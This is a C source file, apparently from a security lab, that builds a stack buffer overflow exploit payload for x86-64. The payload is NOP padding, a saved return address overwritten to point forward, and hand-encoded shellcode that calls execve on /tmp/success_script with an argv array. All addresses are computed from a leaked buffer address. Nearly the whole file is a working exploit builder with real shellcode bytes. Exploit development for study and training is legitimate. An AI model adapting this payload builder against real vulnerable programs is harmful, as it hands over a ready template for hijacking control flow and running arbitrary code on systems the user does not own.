/*
 * payload.c
 *
 * Implementation of the exploit payload builder.
 *
 * Layout, starting at the vulnerable buffer:
 *
 *   [ NOP padding (ret_offset) ][ saved RIP ][ shellcode ][ argv[] ][ strings ]
 *                                    |            ^
 *                                    +------------+  overwritten to point forward
 *
 * Because the overflow offset may be small, the shellcode and its data are
 * placed after the saved return address; the overwritten return address points
 * forward to the shellcode. All absolute addresses are derived from the leaked
 * buffer address passed in at runtime.
 */

#include "payload.h"

#include <errno.h>
#include <stdlib.h>
#include <string.h>

/* Program executed by the shellcode once control is hijacked. */
#define SUCCESS_SCRIPT_PATH "/tmp/success_script"

/*
 * Proof-of-exploitation marker passed as argv[1]. The original lab used a
 * unique identifier here so a successful run could be attributed; it carries
 * no functional meaning and is replaced with a neutral placeholder.
 */
#define PROOF_MARKER "0000000"

bool parse_u64(const char *s, uint64_t *out)
{
    if (s == NULL || out == NULL) {
        return false;
    }

    char *end = NULL;
    errno = 0;

    int base = 10;
    if (strncmp(s, "0x", 2) == 0 || strncmp(s, "0X", 2) == 0) {
        base = 16;
    }

    uint64_t v = strtoull(s, &end, base);
    if (errno != 0 || end == s || *end != '\0') {
        return false;
    }
    *out = v;
    return true;
}

/* Store a 64-bit value into out[0..7] in little-endian byte order. */
static void store_le64(uint8_t out[8], uint64_t v)
{
    for (unsigned i = 0; i < 8; i++) {
        out[i] = (uint8_t)((v >> (8U * i)) & 0xFFU);
    }
}

uint8_t *build_payload(uint64_t buffer_addr, uint64_t ret_offset, size_t *out_size)
{
    if (out_size == NULL) {
        return NULL;
    }

    /*
     * Shellcode: execve("/tmp/success_script", argv, NULL)
     *   movabs $path_addr, %rdi   ; arg1: program path
     *   movabs $argv_addr, %rsi   ; arg2: argv
     *   xor    %edx, %edx         ; arg3: envp = NULL
     *   mov    $59,    %eax       ; execve syscall number
     *   syscall
     * The two movabs immediates are absolute addresses patched in below.
     */
    const uint8_t mov_rdi_imm[] = {0x48, 0xBF};
    const uint8_t mov_rsi_imm[] = {0x48, 0xBE};
    const uint8_t xor_edx_edx[] = {0x31, 0xD2};
    const uint8_t mov_eax_59[]  = {0xB8, 0x3B, 0x00, 0x00, 0x00};
    const uint8_t syscall_op[]  = {0x0F, 0x05};

    const size_t shellcode_size =
        sizeof(mov_rdi_imm) + 8 +
        sizeof(mov_rsi_imm) + 8 +
        sizeof(xor_edx_edx) +
        sizeof(mov_eax_59) +
        sizeof(syscall_op);

    const size_t saved_rip_size = 8;
    const size_t argv_bytes     = 3U * 8U; /* path ptr, marker ptr, NULL */
    const char   path[]         = SUCCESS_SCRIPT_PATH;
    const char   marker[]       = PROOF_MARKER;
    const size_t path_len       = strlen(path) + 1U;
    const size_t marker_len     = strlen(marker) + 1U;

    /* Absolute runtime addresses of each region placed after the saved RIP. */
    const uint64_t shellcode_addr = buffer_addr + ret_offset + saved_rip_size;
    const uint64_t argv_addr      = shellcode_addr + shellcode_size;
    const uint64_t path_addr      = argv_addr + argv_bytes;
    const uint64_t marker_addr    = path_addr + path_len;

    const size_t payload_size =
        (size_t)ret_offset + saved_rip_size + shellcode_size +
        argv_bytes + path_len + marker_len;

    uint8_t *buf = calloc(payload_size, 1U);
    if (buf == NULL) {
        return NULL;
    }

    size_t o = 0;

    /* NOP padding up to the saved return address. */
    memset(buf, 0x90, (size_t)ret_offset);
    o = (size_t)ret_offset;

    /* Overwrite the saved return address to point at the shellcode. */
    store_le64(buf + o, shellcode_addr);
    o += saved_rip_size;

    /* Shellcode, with absolute data addresses patched in. */
    memcpy(buf + o, mov_rdi_imm, sizeof(mov_rdi_imm)); o += sizeof(mov_rdi_imm);
    store_le64(buf + o, path_addr); o += 8;

    memcpy(buf + o, mov_rsi_imm, sizeof(mov_rsi_imm)); o += sizeof(mov_rsi_imm);
    store_le64(buf + o, argv_addr); o += 8;

    memcpy(buf + o, xor_edx_edx, sizeof(xor_edx_edx)); o += sizeof(xor_edx_edx);
    memcpy(buf + o, mov_eax_59,  sizeof(mov_eax_59));  o += sizeof(mov_eax_59);
    memcpy(buf + o, syscall_op,  sizeof(syscall_op));  o += sizeof(syscall_op);

    /* argv = { path, marker, NULL } */
    store_le64(buf + o, path_addr);   o += 8;
    store_le64(buf + o, marker_addr); o += 8;
    store_le64(buf + o, 0U);          o += 8;

    /* String data referenced by argv. */
    memcpy(buf + o, path, path_len);     o += path_len;
    memcpy(buf + o, marker, marker_len); o += marker_len;

    if (o != payload_size) {
        free(buf);
        return NULL;
    }

    *out_size = payload_size;
    return buf;
}
